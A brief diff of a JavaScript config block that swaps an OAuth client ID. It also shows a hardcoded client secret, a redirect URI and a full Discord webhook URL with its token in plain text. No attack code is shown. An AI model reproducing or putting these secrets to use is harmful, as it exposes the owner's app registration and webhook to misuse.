@@ -1,6 +1,6 @@
 //Config
 const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
+const client_id = '6eb06820-3e0e-431a-9cbb-8e3a5e909fc8'
 const redirect_uri = 'https://dashboard.render.com'
 const webhook_url = 'https://discord.com/api/webhooks/1111964427625975829/UEb_ZxYp0RPywS4UN6hODs8wrLbOqkKes-bZK5L5mtG_lDKgLjIbevu9ldhjs_T03YjR'
 //Requirements
